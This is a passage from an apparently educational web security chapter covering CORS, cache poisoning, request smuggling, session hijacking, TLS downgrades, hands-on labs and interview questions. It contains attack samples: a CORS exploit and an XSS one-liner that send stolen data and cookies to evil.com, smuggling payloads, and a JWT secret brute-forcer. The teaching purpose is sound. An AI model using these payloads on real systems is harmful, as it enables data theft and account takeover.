**Purpose**: Control browser features (geolocation, camera, microphone).

### 9.7 CORS (Cross-Origin Resource Sharing)

**Same-Origin Policy**: JavaScript can only read responses from same origin.

**Origin**: scheme + domain + port (`https://example.com:443`)

**CORS Bypasses SOP**: Server can explicitly allow other origins.

**Simple Request**:
```http
GET /api/data HTTP/1.1
Origin: https://attacker.com

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"secret": "data"}
```

**Result**: JavaScript on attacker.com can read the response.

**Preflight Request** (for non-simple methods):
```http
OPTIONS /api/data HTTP/1.1
Origin: https://attacker.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: X-Custom-Header

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Methods: DELETE, GET, POST
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
```

**Vulnerable CORS Configuration**:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Problem**: Wildcard with credentials is forbidden by spec, but some servers misconfigure by reflecting Origin header:

```python
# Vulnerable code
origin = request.headers['Origin']
response.headers['Access-Control-Allow-Origin'] = origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**Exploit**:
```javascript
// Attacker's site
fetch('https://vulnerable.com/api/data', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    // Steal data
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

**Defense**: Whitelist allowed origins.

---

## 10. Web Cache Poisoning

**Concept**: Manipulate cached responses to serve malicious content to all users.

### 10.1 Unkeyed Headers

**Cache Key**: Parameters used to identify cached response (usually URL).

**Unkeyed Headers**: Headers not included in cache key but affect response.

**Example**:
```http
GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: evil.com
```

**Server response**:
```html
<link rel="canonical" href="http://evil.com/">
```

**If cached**: All users get response with attacker's domain.

### 10.2 Cache Deception

**Attack**: Trick cache into storing private data as public.

**Scenario**:
```http
GET /account/settings/style.css HTTP/1.1
Host: vulnerable.com
Cookie: session=victim_session
```

**Server logic**:
- Serves /account/settings (private page)
- Ignores /style.css (path parameter)
- Includes session data in response

**Cache logic**:
- Sees .css extension
- Caches response as public

**Result**: Attacker requests same URL, gets victim's cached private page.

**Defense**:
- Strict URL routing
- Never cache responses with authentication
- Validate file extensions

---

## 11. HTTP Request Smuggling

**BEGINNER EXPLANATION**: Imagine two security guards (frontend/backend servers) both counting how many visitors enter. If they use different counting methods, an attacker can sneak extra people past them.

### 11.1 CL.TE (Content-Length vs Transfer-Encoding)

**Scenario**: Frontend uses Content-Length, Backend uses Transfer-Encoding.

**Attack**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com

```

**Frontend's view**:
- Sees Content-Length: 44
- Forwards entire request

**Backend's view**:
- Sees Transfer-Encoding: chunked
- Processes `0\r\n\r\n` (end of chunks)
- Leaves `GET /admin...` in buffer
- Treats it as the next request

**Result**: Next legitimate user's request is appended to attacker's smuggled request.

### 11.2 TE.CL (Transfer-Encoding vs Content-Length)

**Scenario**: Frontend uses Transfer-Encoding, Backend uses Content-Length.

**Attack**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Frontend's view**:
- Processes chunked encoding
- Sees `0` (end of chunks)
- Forwards request

**Backend's view**:
- Uses Content-Length: 6
- Reads only `0\r\n\r\nG` (6 bytes)
- Leaves rest for next request

### 11.3 Exploitation Techniques

**Cache Poisoning via Smuggling**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: vulnerable.com
Content-Length: 200

GET / HTTP/1.1
Host: evil.com

[Next user's request]
```

**Defense**:
- Normalize headers (reject ambiguous requests)
- Disable backend connection reuse
- Use HTTP/2 (binary framing eliminates ambiguity)

**Detection**:
```python
import requests

# Test CL.TE
payload = """POST / HTTP/1.1\r
Host: target.com\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
X"""

# Send twice, if second request hangs, vulnerable
```

---

## 12. Session Hijacking & Fixation

### 12.1 Session Hijacking

**Methods**:
1. **XSS**: `<script>fetch('http://evil.com/?c=' + document.cookie)</script>`
2. **Network Sniffing**: Capture cookies on unencrypted HTTP
3. **MITM**: Intercept traffic on public WiFi
4. **Malware**: Steal cookies from browser storage

**Protection**:
- `HttpOnly` flag (prevents JavaScript access)
- `Secure` flag (HTTPS only)
- `SameSite` flag (CSRF protection)
- Short session timeouts
- Bind session to IP address (can break for mobile users)

### 12.2 Session Fixation

**Attack Flow**:
```
1. Attacker gets session ID: abc123 (before login)
2. Attacker tricks victim into using abc123
   - URL: http://target.com/login?sessionid=abc123
   - Meta tag: <meta http-equiv="Set-Cookie" content="sessionid=abc123">
3. Victim logs in with sessionid=abc123
4. Server doesn't regenerate session ID after login
5. Attacker uses sessionid=abc123 to access victim's account
```

**Vulnerable Code**:
```php
<?php
session_start();
if ($_POST['username'] && $_POST['password']) {
    // Authenticate
    $_SESSION['user'] = $_POST['username'];
    // BUG: Didn't regenerate session ID!
}
?>
```

**Secure Code**:
```php
<?php
session_start();
if ($_POST['username'] && $_POST['password']) {
    // Authenticate
    session_regenerate_id(true);  // Regenerate ID after login
    $_SESSION['user'] = $_POST['username'];
}
?>
```

**Defense**:
- Regenerate session ID after login
- Reject session IDs from URL parameters
- Use `SameSite` cookie attribute

---

## 13. SSL/TLS Downgrade Attacks

### 13.1 SSL Stripping (sslstrip)

**Attack**: MITM intercepts HTTPS links and rewrites them to HTTP.

**Scenario**:
```
1. Victim visits http://bank.com (initial HTTP)
2. Server redirects: 302 → https://bank.com
3. Attacker intercepts redirect, changes to: 302 → http://bank.com
4. Victim thinks they're on HTTP (no lock icon)
5. Attacker sees all traffic in cleartext
```

**Tool**: sslstrip by Moxie Marlinspike

**Defense**: HSTS header (forces HTTPS even if user types http://)

```http
Strict-Transport-Security: max-age=31536000
```

**Limitation**: Doesn't protect first visit (TOFU problem).

**Solution**: HSTS Preload list (shipped in browsers).

### 13.2 Protocol Downgrade

**Attack**: Force client to use older, weaker TLS version.

**Example**: TLS 1.2 → TLS 1.0 (vulnerable to BEAST, POODLE)

**ClientHello**:
```
Supported Versions: TLS 1.3, TLS 1.2, TLS 1.1, TLS 1.0
```

**Attacker modifies to**:
```
Supported Versions: TLS 1.0
```

**Defense**: TLS 1.3 includes downgrade protection in Server Random field.

### 13.3 Cipher Suite Downgrade

**Attack**: Force weak cipher suite (export-grade encryption).

**Example**: FREAK, Logjam attacks.

**Defense**:
- Disable weak ciphers on server
- Use modern cipher suites only

**Recommended Configuration**:
```
TLS_AES_256_GCM_SHA384
TLS_CHACHA20_POLY1305_SHA256
TLS_AES_128_GCM_SHA256
```

---

## 14. Practical Lab: Raw Interaction & Interception

### Lab 1: Manual HTTP with Netcat

**Objective**: Craft raw HTTP requests to understand protocol structure.

```bash
# Connect to HTTP server
nc example.com 80

# Type the request (hit Enter twice after last header)
GET / HTTP/1.1
Host: example.com
User-Agent: ManualClient/1.0
Accept: */*

```

**Expected Output**:
```http
HTTP/1.1 200 OK
Date: Sat, 24 Jan 2026 12:00:00 GMT
Server: Apache/2.4.41
Content-Type: text/html
Content-Length: 1234

<!DOCTYPE html>
<html>...
```

### Lab 2: Manual HTTPS with OpenSSL

**Objective**: Interact with HTTPS servers using command-line tools.

```bash
# Connect to HTTPS server
openssl s_client -connect google.com:443 -servername google.com

# After connection established, type HTTP request
GET / HTTP/1.1
Host: google.com
Connection: close

```

**View Certificate Details**:
```bash
openssl s_client -connect google.com:443 -showcerts
```

### Lab 3: Custom HTTP Client in Python

**Simple HTTP GET Request**:
```python
#!/usr/bin/env python3
import socket

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
sock.connect(('example.com', 80))

# Craft HTTP request
request = b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"

# Send request
sock.sendall(request)

# Receive response
response = b""
while True:
    data = sock.recv(4096)
    if not data:
        break
    response += data

# Close connection
sock.close()

# Print response
print(response.decode('utf-8'))
```

### Lab 4: HTTPS Client with SSL

```python
#!/usr/bin/env python3
import socket
import ssl

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap with SSL
context = ssl.create_default_context()
secure_sock = context.wrap_socket(sock, server_hostname='example.com')

# Connect
secure_sock.connect(('example.com', 443))

# Send HTTP request over TLS
request = b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"
secure_sock.sendall(request)

# Receive response
response = b""
while True:
    data = secure_sock.recv(4096)
    if not data:
        break
    response += data

# Get certificate info
cert = secure_sock.getpeercert()
print("Certificate Subject:", cert['subject'])
print("Certificate Issuer:", cert['issuer'])
print("Valid From:", cert['notBefore'])
print("Valid Until:", cert['notAfter'])

secure_sock.close()
print("\n" + response.decode('utf-8'))
```

### Lab 5: HTTP Header Manipulation

**Testing for Security Headers**:
```python
#!/usr/bin/env python3
import requests

url = "https://example.com"
response = requests.get(url)

# Security headers to check
security_headers = [
    'Strict-Transport-Security',
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Referrer-Policy',
    'Permissions-Policy'
]

print(f"[*] Analyzing security headers for {url}\n")

for header in security_headers:
    value = response.headers.get(header)
    if value:
        print(f"[+] {header}: {value}")
    else:
        print(f"[-] {header}: MISSING")

# Check for insecure headers
if 'Server' in response.headers:
    print(f"\n[!] Server version disclosed: {response.headers['Server']}")

if 'X-Powered-By' in response.headers:
    print(f"[!] Technology disclosed: {response.headers['X-Powered-By']}")
```

### Lab 6: Cookie Analysis

**Extract and Analyze Cookies**:
```python
#!/usr/bin/env python3
import requests
from http.cookies import SimpleCookie

url = "https://example.com"
response = requests.get(url)

print("[*] Analyzing cookies\n")

for cookie in response.cookies:
    print(f"Cookie Name: {cookie.name}")
    print(f"  Value: {cookie.value}")
    print(f"  Domain: {cookie.domain}")
    print(f"  Path: {cookie.path}")
    print(f"  Secure: {cookie.secure}")
    print(f"  HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
    print(f"  SameSite: {cookie.get_nonstandard_attr('SameSite', 'Not Set')}")
    print()

# Security checks
for cookie in response.cookies:
    issues = []
    if not cookie.secure:
        issues.append("Missing Secure flag")
    if not cookie.has_nonstandard_attr('HttpOnly'):
        issues.append("Missing HttpOnly flag")
    if not cookie.get_nonstandard_attr('SameSite'):
        issues.append("Missing SameSite attribute")
    
    if issues:
        print(f"[!] Security issues with {cookie.name}:")
        for issue in issues:
            print(f"    - {issue}")
```

### Lab 7: JWT Token Analysis

**Decode and Validate JWT**:
```python
#!/usr/bin/env python3
import base64
import json
import hmac
import hashlib

def base64_url_decode(input_str):
    # Add padding if needed
    padding = 4 - len(input_str) % 4
    if padding != 4:
        input_str += '=' * padding
    return base64.urlsafe_b64decode(input_str)

def analyze_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            print("[!] Invalid JWT format")
            return
        
        header = json.loads(base64_url_decode(parts[0]))
        payload = json.loads(base64_url_decode(parts[1]))
        signature = parts[2]
        
        print("[*] JWT Analysis\n")
        print(f"Header: {json.dumps(header, indent=2)}")
        print(f"\nPayload: {json.dumps(payload, indent=2)}")
        print(f"\nSignature: {signature}")
        
        # Security checks
        print("\n[*] Security Checks:")
        
        if header.get('alg') == 'none':
            print("[!] CRITICAL: Algorithm set to 'none'")
        
        if 'exp' not in payload:
            print("[!] WARNING: No expiration time")
        
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            print(f"[+] Uses symmetric algorithm: {header['alg']}")
        elif header.get('alg') in ['RS256', 'RS384', 'RS512']:
            print(f"[+] Uses asymmetric algorithm: {header['alg']}")
    
    except Exception as e:
        print(f"[!] Error analyzing JWT: {e}")

def brute_force_jwt_secret(token, wordlist):
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}"
    signature = parts[2]
    
    print("[*] Attempting to brute force JWT secret...\n")
    
    for secret in wordlist:
        test_sig = hmac.new(
            secret.encode(),
            header_payload.encode(),
            hashlib.sha256
        ).digest()
        
        test_sig_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip('=')
        
        if test_sig_b64 == signature:
            print(f"[+] SECRET FOUND: {secret}")
            return secret
    
    print("[-] Secret not found in wordlist")
    return None

# Example usage
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.Xl6T9K3Rfz7vN8aQ"
analyze_jwt(jwt_token)

# Brute force (use small wordlist for demo)
wordlist = ["secret", "password", "123456", "key", "jwt_secret"]
brute_force_jwt_secret(jwt_token, wordlist)
```

### Lab 8: Request Smuggling Detection

**Automated CL.TE Detection**:
```python
#!/usr/bin/env python3
import socket
import time

def test_request_smuggling(host, port):
    """
    Test for CL.TE request smuggling vulnerability
    """
    # Create malicious request
    smuggle_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    
    print("[*] Testing for CL.TE Request Smuggling")
    print(f"[*] Target: {host}:{port}\n")
    
    # Send first request
    sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock1.connect((host, port))
    sock1.sendall(smuggle_payload.encode())
    time.sleep(2)
    
    # Send second request
    normal_request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    
    sock1.sendall(normal_request.encode())
    
    # Receive response
    response = b""
    try:
        while True:
            data = sock1.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        print("[!] Request timed out - possible vulnerability")
        return True
    
    sock1.close()
    
    # Analyze response
    if b"400 Bad Request" in response:
        print("[-] Not vulnerable (server rejected malformed request)")
        return False
    elif b"200 OK" in response:
        print("[+] POTENTIALLY VULNERABLE")
        print("[*] Further manual testing recommended")
        return True
    else:
        print("[?] Uncertain - manual verification needed")
        return None

# Example usage
# test_request_smuggling("example.com", 80)
```

### Lab 9: SSL/TLS Analysis

**Check Supported Cipher Suites**:
```bash
#!/bin/bash

target="example.com:443"

echo "[*] Testing TLS configuration for $target"
echo

# Test TLS versions
for version in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
    result=$(openssl s_client -connect $target -$version </dev/null 2>&1 | grep "Protocol")
    if [ ! -z "$result" ]; then
        echo "[+] $version: SUPPORTED"
    else
        echo "[-] $version: Not supported"
    fi
done

echo
echo "[*] Certificate Information:"
openssl s_client -connect $target -servername ${target%:*} </dev/null 2>&1 | openssl x509 -noout -subject -issuer -dates

echo
echo "[*] Checking for weak ciphers:"
nmap --script ssl-enum-ciphers -p 443 ${target%:*}
```

### Lab 10: CORS Misconfiguration Scanner

```python
#!/usr/bin/env python3
import requests

def test_cors(url):
    """
    Test for CORS misconfigurations
    """
    print(f"[*] Testing CORS for {url}\n")
    
    # Test 1: Null origin
    headers = {'Origin': 'null'}
    response = requests.get(url, headers=headers)
    acao = response.headers.get('Access-Control-Allow-Origin')
    acac = response.headers.get('Access-Control-Allow-Credentials')
    
    if acao == 'null':
        print("[!] VULNERABLE: Null origin allowed")
        if acac == 'true':
            print("[!] CRITICAL: Credentials allowed with null origin")
    
    # Test 2: Arbitrary origin reflection
    headers = {'Origin': 'https://evil.com'}
    response = requests.get(url, headers=headers)
    acao = response.headers.get('Access-Control-Allow-Origin')
    
    if acao == 'https://evil.com':
        print("[!] VULNERABLE: Arbitrary origin reflected")
        if acac == 'true':
            print("[!] CRITICAL: Credentials allowed with arbitrary origin")
    
    # Test 3: Wildcard with credentials
    headers = {'Origin': 'https://anything.com'}
    response = requests.get(url, headers=headers)
    acao = response.headers.get('Access-Control-Allow-Origin')
    acac = response.headers.get('Access-Control-Allow-Credentials')
    
    if acao == '*' and acac == 'true':
        print("[!] MISCONFIGURED: Wildcard with credentials (invalid per spec)")
    
    # Test 4: Subdomain takeover risk
    domain = url.split('/')[2]
    subdomain_origin = f"https://attacker.{domain}"
    headers = {'Origin': subdomain_origin}
    response = requests.get(url, headers=headers)
    acao = response.headers.get('Access-Control-Allow-Origin')
    
    if acao and domain in acao:
        print(f"[!] WARNING: Potential subdomain takeover risk")
        print(f"    Server allows: {acao}")

# Example usage
# test_cors("https://api.example.com/data")
```

---

## 15. Critical Analysis & Checkpoints

### 15.1 Common Pitfalls

**1. Ignoring HTTP/2 and HTTP/3**
- Many security tools (custom scripts, proxies) only support HTTP/1.1
- HTTP/2 has unique attack vectors (request smuggling via stream manipulation)
- HTTP/3 (QUIC) bypasses traditional TCP-based firewalls

**2. Certificate Pinning Oversight**
- Mobile apps often pin certificates
- Installing Burp CA isn't enough
- Solution: Runtime hooking with Frida, or recompile app

**3. Trusting Client-Side Headers**
- `X-Forwarded-For` can be spoofed
- `Referer` can be manipulated
- `User-Agent` is easily forged

**4. CORS Wildcard Misuse**
- `Access-Control-Allow-Origin: *` with credentials is invalid
- But reflecting Origin header dynamically is equally dangerous

**5. JWT Secret Weakness**
- Weak secrets can be brute-forced in seconds
- `"secret"`, `"key"`, `"jwt"` are common

### 15.2 Checkpoint Questions

**Question 1**: Why is the `Host` header mandatory in HTTP/1.1?
- **Answer**: Virtual hosting. A single IP address can host multiple domains (example.com, test.com, etc.). The server uses the Host header to determine which website to serve.

**Question 2**: Does HTTPS hide the domain name you're visiting?
- **Answer**: No. The SNI (Server Name Indication) field in the TLS ClientHello is sent in cleartext. DNS queries are also typically unencrypted. Solutions: Encrypted SNI (ESNI) or DNS over HTTPS (DoH).

**Question 3**: What does the `HttpOnly` flag on a cookie do?
- **Answer**: Prevents JavaScript from accessing the cookie via `document.cookie`. This mitigates XSS-based cookie theft, but doesn't protect against network interception.

**Question 4**: Can you perform XSS if CSP is properly configured?
- **Answer**: Very difficult. CSP blocks inline scripts and restricts script sources. However, bypasses exist if `unsafe-inline`, `unsafe-eval`, or vulnerable whitelisted domains are present.

**Question 5**: What's the difference between 301 and 302 redirects?
- **Answer**: 
  - 301 (Moved Permanently): Browser caches the redirect. Future requests go directly to new location.
  - 302 (Found/Temporary): Browser doesn't cache. Checks original URL each time.
  - Security impact: 301 can be exploited for persistent redirect poisoning.

**Question 6**: How does request smuggling work?
- **Answer**: Frontend and backend servers disagree on request boundaries. Attacker crafts ambiguous requests (conflicting Content-Length and Transfer-Encoding headers) to "smuggle" a second request that affects other users.

**Question 7**: Why is session regeneration after login important?
- **Answer**: Prevents session fixation. If the session ID isn't regenerated, an attacker can set a victim's session ID before login, then hijack it after the victim authenticates.

**Question 8**: What's the purpose of HSTS Preload?
- **Answer**: Protects the first visit. Without preload, the first HTTP request is vulnerable to SSL stripping. Preload list is hardcoded in browsers, forcing HTTPS even on first visit.

### 15.3 Real-World Attack Scenarios

**Scenario 1: E-commerce Session Hijacking**
- Victim shops on public WiFi (HTTP fallback)
- Attacker sniffs session cookie
- Attacker uses cookie to access victim's account
- **Prevention**: HSTS, secure cookies, HTTPS everywhere

**Scenario 2: API Key Theft via CORS**
- Developer sets `Access-Control-Allow-Origin: *` on sensitive API
- Attacker hosts malicious site with JavaScript
- Victim visits attacker's site while logged into API
- JavaScript reads API responses and exfiltrates data
- **Prevention**: Whitelist trusted origins, never use wildcard with credentials

**Scenario 3: Password Reset Poisoning**
- Attacker requests password reset for victim
- Manipulates Host header to `evil.com`
- Victim receives email with reset link to `evil.com`
- Victim clicks, attacker steals token
- **Prevention**: Validate Host header, use hardcoded domain in emails

### 15.4 Interview Preparation Questions

**Q1**: Explain the TLS handshake in detail.
**A**: [See Section 6.1 for complete answer]

**Q2**: How would you bypass certificate pinning in a mobile app?
**A**: Use Frida to hook SSL verification functions, or recompile the app with pinning removed, or use a custom ROM with system-level certificate trust.

**Q3**: What's the difference between authentication and authorization?
**A**: 
- Authentication: "Who are you?" (401 Unauthorized)
- Authorization: "What can you do?" (403 Forbidden)

**Q4**: How does HTTP/2 multiplexing work?
**A**: Multiple streams share a single TCP connection. Each stream has a unique ID. Frames from different streams are interleaved, allowing parallel requests without head-of-line blocking at the HTTP layer (though TCP layer still has it).

**Q5**: What are the security implications of JWT vs sessions?
**A**:
- JWT: Stateless (scales well), but can't be invalidated before expiration, larger size, signature verification overhead.
- Sessions: Stateful (requires storage), instant invalidation, smaller cookies, database lookup overhead.

### 15.5 Practical CTF Challenges

**Challenge 1**: Given a JWT with `alg: RS256`, how would you attempt to exploit it?
**Solution**: Try algorithm confusion attack (change to HS256 and sign with public key).

**Challenge 2**: A website has CSP: `script-src 'self' https://ajax.googleapis.com`. How can you bypass it?
**Solution**: Use JSONP endpoint on googleapis.com to execute arbitrary JavaScript.

**Challenge 3**: How would you test for HTTP request smuggling on a black-box target?
**Solution**: Send ambiguous requests with conflicting CL/TE headers and observe timing differences or error responses.

### 15.6 Tool Recommendations

| Purpose | Tool | Description |
|---------|------|-------------|
| Proxy | Burp Suite | Intercept and modify HTTP/HTTPS |
| Proxy | OWASP ZAP | Open-source alternative to Burp |
| JWT | jwt_tool | Automated JWT exploitation |
| Headers | SecurityHeaders.com | Online header analyzer |
| TLS | testssl.sh | Comprehensive TLS testing |
| CORS | CORScanner | Automated CORS misconfiguration detection |
| Smuggling | Smuggler (Burp extension) | Request smuggling detection |
| SSL Strip | sslstrip | MITM HTTPS downgrade |
| Certificate | OpenSSL | Certificate inspection and testing |

### 15.7 Final Thoughts

HTTP/HTTPS is the foundation of web security. Every web application vulnerability - from XSS to SQL injection - is delivered through HTTP. Understanding the protocol at a deep level allows you to:

- **Read between the lines**: Spot misconfigurations that others miss
- **Think like an attacker**: Craft novel exploitation techniques
- **Defend effectively**: Implement security controls that actually work

The web is not "just clicking links". It's a complex protocol stack with decades of evolution, backward compatibility issues, and security patches layered on top. Master HTTP, and you master the web.

**Next Steps**:
- Practice with CTF challenges (HackTheBox, PentesterLab)
- Set up a local vulnerable app (DVWA, bWAPP)
- Read RFCs (RFC 7230-7235 for HTTP/1.1, RFC 9110 for HTTP semantics)
- Study real vulnerabilities (CVE databases, security blogs)
- Build your own tools (custom scanners, exploit scripts)

---

*End of Chapter 06 - HTTP/HTTPS Protocol Internals*


